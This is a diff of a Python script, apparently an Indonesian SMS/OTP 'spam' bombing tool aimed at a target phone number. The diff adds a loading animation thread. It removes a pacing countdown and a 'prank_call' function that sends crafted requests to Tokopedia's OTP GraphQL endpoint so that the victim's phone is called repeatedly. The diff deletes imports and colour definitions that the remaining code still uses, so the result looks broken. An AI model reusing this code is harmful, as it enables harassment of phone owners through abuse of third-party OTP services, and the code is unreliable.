@@ -1,36 +1,22 @@
-import os, sys, time, threading
-from datetime import datetime
-from config import _x
-from junk import G, C, Y, R, P, W, N, _u
+import threading
 
-COLORS = ["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"]
+LOADING = True
 
-def game_loading():
+def loading_loop():
     bars = 10
-    print("")
-    for i in range(bars + 1):
+    i = 0
+    while LOADING:
         filled = "♦" * i
         empty = "░" * (bars - i)
         color = COLORS[i % len(COLORS)]
         sys.stdout.write(f"\r  [{color}{filled}{N}{empty}] ")
         sys.stdout.flush()
-        time.sleep(0.15)
-    sys.stdout.write("\r" + " " * 40 + "\r")
-
-def countdown(seconds=300):
-    print(f"\n  {Y}[!] Pake jeda dulu biar ga keblokir dari server.{N}")
-    print(f"  {Y}[*] Tunggu 5 menit atau exit + jalanin lagi.{N}")
-    print("")
-    while seconds > 0:
-        m = seconds // 60
-        s = seconds % 60
-        sys.stdout.write(f"\r  {P}⏳ {m:02d}:{s:02d}{N} ")
-        sys.stdout.flush()
-        time.sleep(1)
-        seconds -= 1
+        i = (i + 1) % (bars + 1)
+        time.sleep(0.2)
     sys.stdout.write("\r" + " " * 40 + "\r")
 
 def spam(phone):
+    global LOADING
     print(f"\n  {C}[*] Target : {phone}{N}")
     
     try:
@@ -53,18 +39,19 @@ def spam(phone):
     except:
         speed = 3
     
-    print(f"\n  {C}[*] Loop : {loop}x | Delay : {speed}s{N}")
-    game_loading()
+    print(f"\n  {C}[*] Loop : {loop}x | Delay : {speed}s{N}\n")
     
     sent = []
     blocked = []
     failed = []
     
+    # Start loading thread
+    LOADING = True
+    t = threading.Thread(target=loading_loop)
+    t.start()
+    
     for l in range(loop):
-        if loop > 1:
-            print(f"  {Y}--- Loop {l+1}/{loop} ---{N}")
         el = _x(phone)
-        
         for name, url, h, b in el:
             h["User-Agent"] = _u()
             
@@ -96,39 +83,14 @@ def spam(phone):
                 failed.append(name)
             time.sleep(speed)
     
+    # Stop loading thread
+    LOADING = False
+    t.join()
+    sys.stdout.write("\r" + " " * 40 + "\r")
+    
     print(f"\n  {G}=== HASIL ==={N}")
     if sent: print(f"  {G}✓ Terkirim ({len(sent)}): {', '.join(sent)}{N}")
     if blocked: print(f"  {Y}⊗ Diblokir ({len(blocked)}): {', '.join(blocked)}{N}")
     if failed: print(f"  {R}✗ Gagal ({len(failed)}): {', '.join(failed)}{N}")
     
-    countdown(300)
-    input(f"\n  {W}[Enter] Kembali...{N}")
-
-def prank_call(phone):
-    print(f"\n  {C}[*] Target : {phone}{N}")
-    try:
-        count = int(input(f"  {C}[?] Jumlah panggilan (1-5): {N}").strip() or "3")
-        if count < 1: count = 1
-        if count > 5: count = 5
-    except:
-        count = 3
-    
-    print(f"\n  {C}[*] Nelpon {count}x via Tokopedia...{N}")
-    game_loading()
-    
-    Q = "query OTPRequest($a:String!,$b:String,$c:String,$d:String,$e:Int){OTPRequest:OTPRequestV2(otpType:$a,mode:$b,msisdn:$c,email:$d,otpDigit:$e){success message}}"
-    url = "https://gql.tokopedia.com/graphql/OTPRequest"
-    
-    for i in range(count):
-        try:
-            import requests as _rr
-            h = {"Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/login","tokopedia-lite":"otp","User-Agent":_u()}
-            b = {"operationName":"OTPRequest","query":Q,"variables":{"a":"116","b":"phone","c":phone[1:],"d":"","e":6}}
-            rr = _rr.post(url, json=b, headers=h, timeout=15)
-            print(f"  [{i+1}/{count}] ✓ Memanggil... ({rr.status_code})")
-        except:
-            print(f"  [{i+1}/{count}] ✗ Gagal")
-        time.sleep(5)
-    
-    print(f"\n  {G}✓ Selesai. Target ditelepon {count}x.{N}")
     input(f"\n  {W}[Enter] Kembali...{N}")
